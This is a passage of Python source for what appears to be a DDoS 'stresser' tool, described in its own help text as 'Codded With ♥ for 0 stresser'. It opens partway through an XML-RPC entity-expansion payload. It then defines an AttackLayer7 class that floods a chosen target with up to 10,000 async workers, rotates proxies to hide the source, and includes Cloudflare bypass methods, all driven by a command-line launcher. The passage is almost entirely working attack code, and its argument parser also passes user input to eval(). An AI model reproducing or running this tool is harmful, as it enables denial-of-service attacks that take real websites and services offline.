poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;</methodName>
      <params>
       <param><value>%RANDOM%</value></param>
       <param><value>%RANDOM%</value></param>
      </params>
    </methodCall>"""
    HEXS = r'\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87' \
           r'\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F' \
           r'\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F' \
           r'\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84' \
           r'\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F' \
           r'\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98' \
           r'\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98' \
           r'\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B' \
           r'\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99' \
           r'\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C' \
           r'\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA '
    USER_AGENTS = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                   "(KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36"]
    HTTP1_VERSIONS = 1.1, 1.2, 1.3


class AttackLayer7:
    custom_headers: str
    target: URL
    _post_data: str or None
    method: Methods
    request_type: HttpRequestType
    pps: Counter
    cps: Counter
    errors: Counter
    workers: Counter

    def __init__(self, *,
                 target: str,
                 duration: int,
                 method: Methods = Methods.HTTP_RAW,
                 workers: int = 1024,
                 rpc: int = 100,
                 verbose: bool = True,
                 request_type: HttpRequestType = HttpRequestType.GET,
                 post_data: str = None,
                 custom_header: Dict[str, str] = None):

        self._duration = duration
        self.request_type = request_type or HttpRequestType.GET
        self.method = method or Methods.HTTP_RAW
        self.post_data = ""
        self.verbose = verbose
        self.raw_post_data = None

        custom_header = custom_header or {}

        if post_data:
            self.raw_post_data = {k: v[0] for k, v in parse_qs(post_data).items()}
            
            print(post_data)
            
            self.post_data = "\r\n" + post_data
            custom_header.update({"Content-Length": str(len(post_data)),
                                  "Content-Type": "application/x-www-form-urlencoded"})

        self.raw_custom_header = custom_header

        self.target = URL(target or None)
        self.custom_headers = "\r\n".join(["%s: %s" % (k, v) for k, v in custom_header.items()])

        if custom_header:
            self.custom_headers += "\r\n"

        self.event = Event()
        self._workers = workers or 1024
        self.rpc = rpc or 100
        self.pps, self.cps, self.errors, self.workers = (Counter() for _ in range(4))
        self.isTLS = self.target.scheme.lower() == "https"
        self.tls = {"ctx": ctx if self.isTLS else None,
                    "server_hostname": self.target.host if self.isTLS else None}

    async def open_connection(self, proxy=None) -> Tuple[StreamReader, StreamWriter]:
        if not proxy:
            proxy = Tools.choiceProxy()


        sock = await proxy.connect(dest_host=self.target.host,
                                   dest_port=self.target.port,
                                   timeout=10)

        return await open_connection(host=None,
                                              port=None,
                                              ssl=self.tls["ctx"],
                                              sock=sock,
                                              server_hostname=self.tls["server_hostname"])

    # noinspection PyCallingNonCallable,PyBroadException
    async def _worker(self):
        await self.event.wait()

        while True:
            try:
                self.workers += 1

                if {self.method} & {MethodsFunction.CF_BYPASS, MethodsFunction.HTTP_BYPASSV2}:
                    await self.method(self)
                    continue

                await wait_for(self.method(self), timeout=5)
            except Exception as e:
                await sleep(0)
                # traceback.print_exc()
                self.errors += 1

    async def start(self):
        self.event.clear()

        tasks = []

        for _ in range(self._workers):
            tasks.append(create_task(self._worker()))

        self.event.set()

        start_timer = (perf_counter() + self._duration)
        diff = self._duration

        while diff > 0:
            await sleep(1)

            if self.verbose:
                formatted_diff = "%02d:%02d:%02d" % (diff / 3600, (diff % 3600) / 60, (diff % 60))

                print(f"PPS: {await self.pps.value:,} | "
                      f"CPS: {await self.cps.value:,} | "
                      f"ERRORS: {await self.errors.value:,} | "
                      f"WORKERS: {await self.workers.value:,} | "
                      f"Timer: {formatted_diff.replace('00:', '')}")

            diff = start_timer - perf_counter()
            MagicData.PASSED.clear()
            await self.reset()

        self.event.clear()

        for task in tasks:
            task.cancel()

    async def reset(self):
        await self.cps.reset()
        await self.pps.reset()
        await self.errors.reset()
        await self.workers.reset()


async def main():
    methods = [x for x, y in MethodsFunction.__dict__.items() if isinstance(y, staticmethod)]
    parser = ArgumentParser(description='Codded With ♥ for 0 stresser')

    parser.add_argument('-t', '--target', help='Target', required=True)

    parser.add_argument('-p', '--postdata', help='postdata')
    parser.add_argument('-f', '--headers', help='headers')
    
    parser.add_argument('-x', '--request_type',
                        type=lambda i: HttpRequestType[i],
                        choices=list(HttpRequestType),
                        default=HttpRequestType.GET,
                        help='request_type')

    parser.add_argument('-m', '--method',
                        type=lambda i: eval("Methods.%s" % i) if i.upper() in methods else None,
                        help='method',
                        default=Methods.HTTP_RAW)

    parser.add_argument('-w', '--workers', help='workers', type=int, default=10000)
    parser.add_argument('-d', '--duration', help='duration', type=int, required=True)
    parser.add_argument('-r', '--rpc', help='rpc', type=int, default=64)

    parser.add_argument('--verbose', action='store_true')

    args = parser.parse_args()

    current = Path(__file__)

    if not args.method:
        parser.print_help()
        exit("%s: error: argument -m/--method: invalid choice: None (choose from \"%s\")" % (current.name,
                                                                                             '", "'.join(methods)))

    ua_file = current.parent / "ua.txt"

    headers = None

    if args.headers:
        headers = {k: v[0] for k, v in parse_qs(args.headers).items()}
        
    if not ua_file.exists():
        exit("Useragent file or proxy file doesn't exists")

    with open("proxy.txt") as f:
        MagicData.RAW_PROXIES = [x.strip() for x in f.readlines() if "://" in x]
    
    MagicData.PROXIES = [Proxy.from_url(x.strip()) for x in MagicData.RAW_PROXIES if "://" in x]

    with ua_file.open("r+") as f:
        MagicData.USER_AGENTS = [x.strip() for x in f.readlines()]
        
    if args.verbose:
        print("Attack started !", args)

    await AttackLayer7(target=URL(args.target),
                       workers=args.workers,
                       rpc=args.rpc,
                       duration=args.duration,
                       request_type=args.request_type,
                       post_data=args.postdata,
                       custom_header=headers,
                       verbose=args.verbose,
                       method=args.method).start()

    
if __name__ == '__main__':
    run(main())
